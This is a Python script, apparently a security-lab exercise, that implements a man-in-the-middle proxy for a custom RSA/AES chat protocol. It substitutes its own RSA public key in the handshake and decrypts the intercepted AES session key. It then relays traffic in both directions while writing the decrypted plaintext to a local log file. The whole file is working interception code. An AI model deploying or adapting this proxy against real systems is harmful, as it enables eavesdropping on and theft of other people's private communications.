import socket
import rsa
import random
from collections import deque
from threading import Thread, current_thread
from Crypto.Cipher import AES
import json
import os
from Crypto.Random import get_random_bytes
from base64 import b64encode
from time import time
import pickle
import select


MSGLEN = 1024
IP = '0.0.0.0'
PORT = 5005


class Client:
	def __init__(self, sock):
		# save client socket
		self.sock = sock
		
		# create socket to connect to real server as a client
		self.sock_to_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock_to_server.connect(('0.0.0.0', 5000))
#		self.sock_to_server.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

	def retrieve_session_key(self, priv):	
		# get key and read
		key = rsa.decrypt(self.sock_to_server.recv(MSGLEN), priv)
		iv = key
		self.aes = AES.new(key, AES.MODE_CFB, iv)
		print('new key:', key)
		
		# send to client
		msg = rsa.encrypt(key, self.real_pub)
		self.sock.sendall(msg)


class Mitm:

	def __init__(self, ip_cl, port_cl):

		# mitm server
		self.sock_cl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock_cl.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.sock_cl.bind(((ip_cl, port_cl)))
		self.sock_cl.listen(5)
		self.clients = deque()
		
		# generate or load mitm rsa
		if os.path.isfile('rsa/rsa_priv'):
			with open('rsa/rsa_pub.pem', 'rb') as file:
				self.pub = rsa.PublicKey.load_pkcs1(file.read())
			with open('rsa/rsa_priv.pem', 'rb') as file:
				self.priv = rsa.PrivateKey.load_pkcs1(file.read())
		else:
			(self.pub, self.priv) = rsa.newkeys(1024)
			with open('rsa/rsa_pub.pem', 'wb') as file:
				file.write(self.pub.save_pkcs1('PEM'))
			with open('rsa/rsa_priv.pem', 'wb') as file:
				file.write(self.priv.save_pkcs1('PEM'))
		
		self.begin_loop()


#	def send_aes(self):
#		# send aes
#		msg = rsa.encrypt(self.key, self.pub_cl)
#		self.sock_cl.sendall(msg)


	def handle_client(self, client):
		# get public rsa
		try:
			pub = client.sock.recv(1024).decode()
			client.real_pub = rsa.key.PublicKey.load_pkcs1(pub, 'PEM')
		except:
			return
			
		# send mitm rsa publickey to server
		msg = self.pub.save_pkcs1('PEM').decode()
		sent = client.sock_to_server.sendall(msg.encode())
		if sent is not None:
			raise RuntimeError("socket connection broken")
			
		# get session key
		client.retrieve_session_key(self.priv)
		
		# Sockets from which we expect to read
		inputs = [ client.sock, client.sock_to_server ]

		# Sockets to which we expect to write
		outputs = [ client.sock, client.sock_to_server ]
		
		while True:
			try:
			
				readable, writable, exceptional = select.select(inputs, outputs, inputs)
				
				if not readable:
					continue
					
				if client.sock in readable:	  
					# if client sends	  
					data = client.sock.recv(MSGLEN).strip(b'\r\n')
					with open("log.txt", "a+") as f:
						msg = client.aes.decrypt(data).decode('latin-1')
						f.write(msg)
					client.sock_to_server.sendall(data)
					
				else:
					# if server sends
					data = client.sock_to_server.recv(MSGLEN).strip(b'\r\n')
					with open("log.txt", "a+") as f:
						msg = client.aes.decrypt(data).decode('latin-1')
						f.write(msg)
					client.sock.sendall(data)
			except Exception as e:
				print(e)
				
		return
		
	def begin_loop(self):
		while True:
			# wait for connections
			(clientsocket, address) = self.sock_cl.accept()

			# create new Client object and new thread
			new_client = Client(clientsocket)
			self.clients.append(new_client)

			Thread(target=self.handle_client, args=(new_client,)).start()

		return


if __name__ == '__main__':
	print("Starting mitm...")

	Mitm(IP, PORT)
	
	
	
	# if msg == 999, then wait for new session


